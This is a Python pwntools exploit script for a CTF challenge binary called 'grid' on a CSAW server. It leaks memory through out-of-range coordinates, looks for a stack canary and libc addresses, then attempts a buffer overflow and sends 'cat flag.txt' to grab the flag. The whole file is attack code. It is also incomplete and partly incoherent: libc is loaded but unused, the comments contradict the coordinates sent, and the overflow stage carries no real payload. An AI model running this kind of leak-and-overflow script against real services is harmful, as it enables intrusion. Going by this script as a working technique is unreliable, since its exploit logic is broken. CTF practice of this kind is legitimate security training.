from pwn import *

context.binary = ELF('./ctf_files/grid')
libc = ELF('./ctf_files/libc-2.27.so')

def place_shape(io, shape, x, y):
    io.sendlineafter(b'shape> ', shape)
    io.sendlineafter(b'loc> ', f'{x} {y}'.encode())
    return io.recvuntil(b'shape> ', timeout=1)

def leak_memory():
    io = remote('pwn.chal.csaw.io', 8000)
    leaks = []

    # Try to leak stack and libc addresses
    for x in range(0xfff0, 0x10000, 8):
        try:
            # Send shape and negative coordinate
            res = place_shape(io, b'+', x, 0)
            if res:
                # Try to extract 8-byte values
                data = res.split(b'placing')[0].strip()
                if len(data) >= 8:
                    val = u64(data.ljust(8, b'\x00'))
                    log.info(f"Leak at x={x}: {hex(val)}")
                    if val & 0xff == 0:
                        log.success(f"Possible canary: {hex(val)}")
                    if val > 0x7f0000000000:
                        log.success(f"Possible libc: {hex(val)}")
                    leaks.append((x, val))
        except EOFError:
            log.warning(f"EOF at x={x}")
            break
        except Exception as e:
            log.warning(f"Error at x={x}: {e}")
            continue

    io.close()
    return leaks

def exploit(leaks):
    if not leaks:
        return

    # Found some leaks, now try to exploit
    io = remote('pwn.chal.csaw.io', 8000)

    try:
        # Create a pattern that will overflow the buffer
        for i in range(100):
            place_shape(io, b'+', 0xfff0 + i, i % 16)

        # Try to get control
        io.sendline(b'cat flag.txt')
        result = io.recvall(timeout=2)
        if b'flag{' in result:
            log.success(f"Found flag: {result}")
    except Exception as e:
        log.error(f"Exploitation failed: {e}")
    finally:
        io.close()

def main():
    leaks = leak_memory()
    if leaks:
        log.info(f"Found {len(leaks)} leaks")
        exploit(leaks)
    else:
        log.error("No leaks found")

if __name__ == '__main__':
    main()

